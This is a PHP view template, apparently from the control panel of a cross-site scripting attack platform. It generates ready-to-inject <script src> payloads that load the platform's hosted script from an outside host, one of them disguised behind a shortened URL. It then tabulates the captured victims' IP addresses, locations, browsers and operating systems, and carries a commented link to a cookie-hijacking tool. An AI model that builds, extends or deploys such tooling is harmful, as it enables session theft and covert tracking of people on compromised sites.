
<?php require_once PUBLIC_PATH."public.php"; ?>
<title>.</title>
</head>

<body>
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content" id="modal-content">
</div>
</div>
</div>

<div class="container">
<?php require_once TEMPLATE_PATH."xing/header.tpl.php"; ?>

<script>
function checkAll(type, form, value, checkall, changestyle) {
    var checkall = checkall ? checkall : 'chkall';
    for(var i = 0; i < form.elements.length; i++) {
        var e = form.elements[i];
        if(type == 'option' && e.type == 'radio' && e.value == value && e.disabled != true) {
            e.checked = true;
        } else if(type == 'value' && e.type == 'checkbox' && e.getAttribute('chkvalue') == value) {
            e.checked = form.elements[checkall].checked;
            if(changestyle) {
                multiupdate(e);
            }
        } else if(type == 'prefix' && e.name && e.name != checkall && (!value || (value && e.name.match(value)))) {
            e.checked = form.elements[checkall].checked;
            if(changestyle) {
                if(e.parentNode && e.parentNode.tagName.toLowerCase() == 'li') {
                    e.parentNode.className = e.checked ? 'checked' : '';
                }
                if(e.parentNode.parentNode && e.parentNode.parentNode.tagName.toLowerCase() == 'div') {
                    e.parentNode.parentNode.className = e.checked ? 'item checked' : 'item';
                }
            }
        }
    }
}


</script>
<div class="table-responsive">
<table class="table table-hover">
<thead>
<tr><td> 项目:<?php echo $pro['name']?></td>
<td>示例1: <code><?php $url=url_shorten(SITE_ROOT.$pro['url']);echo htmlentities("<script  src=\"{$url}\" ></script>"); ?></code></td>
<td>示例2: <code><?php $url=SITE_ROOT.$pro['url'];echo htmlentities("<script  src=\"{$url}\" ></script>"); ?></code></td>
<!--td><a href="https://github.com/evilcos/cookiehacker" target="_blank" >Cookie Tool</a></td-->
</tr>
<tr>

</tr>
</thead>
</table>

<table class="table table-hover">
<form action="/?m=xing&a=dels" method="post">

<thead>
<tr>
<th>选择</th>
<th>IP地址</th>
<th>所在地</th>
<th>时间</th>
<th>浏览器</th>
<th>系统</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<?php
if(is_array($browsers)){
    foreach($browsers as $browser){
        $utime=date("Y-m-d H:i:s",$browser['dateline']);
        //load_func("IptoAddr");
        //$addr=ip_to_addr($browser['ip']);
        print<<<END
            <tr>
            <td><input type="checkbox" value="{$browser['bid']}" class="dels" name="delarr[]"></td>
            <td>{$browser['ip']}</td>
            <td><div class="location"><a href="/ip/{$browser['ip']}">loading ...</a></div></td>
            <td>{$utime}</td>
            <td>{$browser['type']}</td>
            <td>{$browser['os']} </td>
            <td>
            <a href="/i/{$browser['bid']}" class="btn btn-sm btn-info" data-toggle="modal" data-target="#myModal">查看</a>
            <a href="/d/{$browser['bid']}" class="btn btn-sm btn-danger">删除</a>
            </td>
            </tr>
END;
    };

}
?>
<tr>
<td>
<input type="checkbox" class="checkbox" id="chkall0z10" name="chkall"  onClick="checkAll('prefix', this.form, 'delarr')"/><label for="chkall0z10">全选</label>
<input type="submit" value="删除选中" id="submit_announcesubmit" class="btn btn-default"/>
</td>
</tr>

</tbody>



</form>

</table>

</div>
</div>
</body>
<script async="async">
$(document).on("hidden.bs.modal", function (e) {
        $(e.target).removeData("bs.modal").find(".modal-content").empty();
        });

$(function(){
        $(".location").each(function(){
            var location = $(this);
            $.ajax({
type: "GET",
url: location.find('a').attr("href"),
success: function(data){
$(function() {
    location.text(data);
    });
}
});
            });
        });


</script>
</html>
